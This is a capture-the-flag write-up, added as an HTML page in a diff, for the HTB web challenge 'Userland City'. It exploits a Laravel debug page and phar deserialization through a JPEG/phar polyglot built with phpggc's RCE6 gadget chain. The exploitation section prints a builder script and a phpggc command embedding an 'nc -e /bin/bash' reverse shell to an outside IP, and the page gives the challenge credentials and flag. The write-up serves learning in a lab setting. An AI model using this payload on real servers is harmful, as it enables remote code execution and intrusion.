@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<meta http-equiv="Content-Type" content="text/html" charset="UTF-8"/>
+
+
+
+
+
+    
+    <link rel="stylesheet" href="/css/main.min.f9b46e3a4a677dd7510a249b19438a1799f77c971a2b5cb9996e81d2eb49d7f0.css" integrity="sha256-+bRuOkpnfddRCiSbGUOKF5n3fJcaK1y5mW6B0utJ1/A="/>
+
+
+    <title> 
+Userland City - sourque 
+ </title>
+</head>
+<body class="bg-black text-white flex flex-col h-screen">
+    
+    
+<main class="flex flex-grow md:container mx-auto grid grid-cols-1 lg:grid-cols-10 px-10 py-8 xl:px-28 2xl:px-54">
+
+        
+        <aside class="lg:sidebar lg:h-screen lg:sticky lg:top-12 col-span-2 pb-2">
+            <ul>
+                <li>
+                    <a class="wacky" href="/">Home</a>
+                </li>
+            </ul>
+
+            
+            <br>
+            <b>Userland City</b>
+            <i><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#debug-page">Debug Page</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+  </ul>
+</nav></i>
+            
+        </aside>
+
+        
+        <div class="main-content col-span-1 lg:col-span-8">
+            <h1>Userland City</h1>
+                
+                Category: <b>web</b>
+                
+                
+                
+
+                <blockquote>
+<p>You are part of a multinational law enforcement operation called  &ldquo;Takeover&rdquo; that targets underground darknet markets, the new target is a referral only market called Userland City. After a string of ops  intercepting traffic in TOR exit nodes, we managed to obtain a verified  vendor&rsquo;s account that goes by the name of lxkid. We&rsquo;re ready for stage  &ldquo;Downfall&rdquo;, Europol has provided us with key software components to  capture cleartext credentials from all marketplace users, spyware to  deliver through key accounts operating with downloadable deliveries, and help us remove the existing image database including the metadata  removal tool. Old IRC logs from one of those devs suggest that the  marketplace is built on top of the latest Laravel version and debug mode is enabled. The credentials of the vendor’s account are  lxkid02:8rsNN9ohfLp69cVRFEgk4Qzs</p>
+</blockquote>
+<h2 id="enumeration">Enumeration</h2>
+<p>We&rsquo;re given creds in the description of the challenge, and a login page with a captcha as the landing page:</p>
+<p><img src="../image-20201123023324618.png" alt="image-20201123023324618"></p>
+<p>I&rsquo;m not coming from a Tor IP address, and the captcha is not exploitable in any way we found, so we&rsquo;re going in prepared for a lot of theming and extra information (some might call &lsquo;lore&rsquo;).</p>
+<p>After logging in, we see a products page with various illegal wares.</p>
+<p><img src="../image-20201123023507292.png" alt="image-20201123023507292"></p>
+<p>Messages and orders are not real links, but we do have a products page where we can upload files:</p>
+<p><img src="../image-20201123023541694.png" alt="image-20201123023541694"></p>
+<p>This is interesting as it&rsquo;s the only real functionality of the application. We&rsquo;re also keeping a lookout for anything pointing to a <code>Laravel</code> debug page/stack trace, since that was mentioned in the description&ndash; so this seems like the juiciest place to look.</p>
+<p>However, before actually being able to do anything with this form, we tried:</p>
+<ul>
+<li>Gobusting (sorry)
+<ul>
+<li>Challenge author left troll (I think) files .htaccess (apache2) and web.config (IIS) when it&rsquo;s an nginx server</li>
+</ul>
+</li>
+<li>Reading the about page lore FEROCIOUSLY and looking up posts from five years ago on the silk road subreddit</li>
+<li>Sobbing, loudly</li>
+<li>Reading the source of every page</li>
+</ul>
+<p>So I guess my point is that I have no idea what I&rsquo;m doing.</p>
+<h2 id="debug-page">Debug Page</h2>
+<p>Anyhow, if we upload a picture, the form works exactly as you would expect. However, if we upload something that is NOT a picture, and try to navigate to it, we get a Laravel debug page! (Well, technically Ignition/Flame or whatever).</p>
+<p><img src="../image-20201123024103551.png" alt="image-20201123024103551"></p>
+<p>This also leaks part of the <code>ProductsContorller.php</code> file, which turns out to be useful. We see that our <code>$filename</code> (presumably extracted from the URL) is being passed to file handling operations. If there&rsquo;s an existing gadget/pop chain, and the <code>phar</code> &ldquo;scheme&rdquo; enabled, we can exploit the application for either LFI or RCE.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>So, downloading <code>phpggc</code>, we see that there are some gadgets for Laravel:</p>
+<p><img src="../image-20201123024507302.png" alt="image-20201123024507302"></p>
+<p>RCE6 looks like the most recent one, let&rsquo;s try that! With source code leaked from the debug page, we can see that the application is checking for a mime type that starts with <code>image/</code>. This means we need to upload a file that is a <code>phar</code> and <code>jpeg</code> (or <code>gif</code> or whatever) polygot. I tried using <code>phpggc</code> as a tool:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./phpggc -pj ./example.jpg -o ./cool.phar laravel/RCE6 <span style="color:#e6db74">&#39;nc -e /bin/bash 167.172.15.1 4250&#39;</span>
+</code></pre></div><p>And many variations on the above, but nothing worked. So we had to use a custom script (thank you to makelaris for help with this!). <code>gadgets.php</code> is pulled from <code>phpggc/gadgetchains/Laravel/RCE/6/gadgets.php</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+    <span style="color:#66d9ef">require</span>(<span style="color:#e6db74">&#39;./gadgets.php&#39;</span>);
+    $code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?php system(&#34;nc -e /bin/bash 167.172.15.1 4250&#34;) ?&gt;&#39;</span>;
+    $expected <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\Illuminate\Broadcasting\PendingBroadcast</span>($code);
+    $image <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\Illuminate\Support\MessageBag</span>($expected);
+
+    $image <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;example.jpg&#39;</span>);
+
+    $phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#39;payload.phar&#39;</span>, <span style="color:#ae81ff">0</span>);
+    $phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#39;test.txt&#39;</span>, <span style="color:#e6db74">&#39;test&#39;</span>);
+    $phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setMetadata</span>($image);
+    $phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setStub</span>(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>image<span style="color:#e6db74">}</span><span style="color:#e6db74"> __HALT_COMPILER(); ?&gt;&#34;</span>);
+
+    <span style="color:#a6e22e">rename</span>(<span style="color:#e6db74">&#39;payload.phar&#39;</span>, <span style="color:#e6db74">&#39;payload.jpg&#39;</span>);
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Viewing the image, we see that it is indeed a real JPEG:</p>
+<p><img src="../image-20201123204013947.png" alt="image-20201123204013947"></p>
+<p>And we append the <code>phar</code> scheme to the image path, for an error and a callback.</p>
+<p><img src="../image-20201123204058418.png" alt="image-20201123204058418"></p>
+<p><img src="../image-20201123025248648.png" alt="image-20201123025248648"></p>
+<p>Now we have a shell, and can browse to grab the flag at <code>/flag/flagc6NpQ</code>!</p>
+<p><img src="../image-20201123024905098.png" alt="image-20201123024905098"></p>
+<p>This was a really interesting challenge! It felt like one of the most &ldquo;real-world&rdquo; ones I&rsquo;ve done, and I learned a ton. Would highly recommend :)</p>
+<p>Flag: <code>HTB{p0p..p0p..p0p..th0s3_ch41ns_0n_th3_way_t0_pr1s0n}</code></p>
+
+        </div>
+     </main>
+
+<footer class="footer py-1">
+    <div class="flex justify-center text-white py-1"></div>
+</footer>
+
+</body>
